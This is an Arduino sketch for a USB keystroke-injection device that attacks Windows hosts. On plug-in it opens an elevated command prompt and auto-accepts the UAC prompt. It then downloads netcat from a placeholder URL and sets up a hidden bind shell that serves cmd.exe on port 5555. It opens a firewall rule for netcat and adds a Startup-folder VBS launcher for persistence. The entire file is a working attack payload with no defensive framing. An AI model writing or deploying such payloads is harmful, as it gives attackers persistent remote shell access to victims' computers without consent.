#include <HID-Project.h>
#include <HID-Settings.h>

// Configuration constants
const char* NETCAT_URL = "http://[NETCAT_DOWNLOAD_LINK]/nc.exe";
const char* NETCAT_PORT = "5555";
const char* ROOT_DIR = "%TEMP%";
const int CMD_DELAY = 500;
const int LONG_DELAY = 1500;
const int SHORT_DELAY = 50;

// Utility function to simulate key press and release
void typeKey(int key) {
  Keyboard.press(key);
  delay(SHORT_DELAY);
  Keyboard.release(key);
}

// Utility function to execute a command with Enter key
void executeCommand(const char* command) {
  Keyboard.print(command);
  typeKey(KEY_RETURN);
  delay(CMD_DELAY);
}

// Utility function to open an elevated command prompt
void openElevatedCmd() {
  // Open Run dialog
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(CMD_DELAY);

  // Start cmd with elevated privileges
  executeCommand("powershell Start-Process cmd -Verb RunAs");

  // Accept UAC prompt
  delay(LONG_DELAY);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(CMD_DELAY);
}

// Utility function to create a file with content
void createFile(const char* filename, const char* content[], int lineCount) {
  executeCommand((String("copy con ") + filename).c_str());
  for (int i = 0; i < lineCount; i++) {
    executeCommand(content[i]);
  }
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();
  typeKey(KEY_RETURN);
}

void setup() {
  // Initialize HID devices
  AbsoluteMouse.begin();
  Keyboard.begin();

  // Open elevated command prompt
  openElevatedCmd();

  // Change to temporary directory
  executeCommand((String("cd ") + ROOT_DIR).c_str());

  // Clean up existing files and processes
  const char* cleanupCommands[] = {
    "TASKKILL /im nc.exe /f",
    "erase /Q nc.exe",
    "erase /Q Start.bat",
    "erase /Q invisible.vbs",
    "erase /Q \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\invisible.vbs\""
  };
  for (const char* cmd : cleanupCommands) {
    executeCommand(cmd);
  }

  // Download Netcat
  executeCommand((String("powershell (new-object System.Net.WebClient).DownloadFile('") + NETCAT_URL + "','nc.exe')").c_str());

  // Create Start.bat
  const char* batchContent[] = {
    (String("cd ") + ROOT_DIR).c_str(),
    (String("nc -lp ") + NETCAT_PORT + " -vv -e cmd.exe -L").c_str()
  };
  createFile("Start.bat", batchContent, 2);

  // Create invisible.vbs
  const char* vbsContent[] = {
    "Set WshShell = CreateObject(\"WScript.Shell\")",
    (String("WshShell.Run chr(34) & \"") + ROOT_DIR + "\\Start.bat\" & Chr(34), 0").c_str(),
    "Set WshShell = Nothing"
  };
  createFile("invisible.vbs", vbsContent, 3);

  // Configure firewall rule for Netcat
  executeCommand((String("netsh advfirewall firewall add rule name=\"Netcat\" dir=in action=allow program=\"") + ROOT_DIR + "\\nc.exe\" enable=yes").c_str());

  // Start the payload invisibly
  executeCommand("start invisible.vbs");

  // Copy invisible.vbs to startup for persistence
  executeCommand((String("copy \"invisible.vbs\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"")).c_str());

  // Exit command prompt
  executeCommand("exit");

  // Terminate HID devices
  Keyboard.end();
  AbsoluteMouse.end();
}

void loop() {
  // Empty loop as payload runs once
}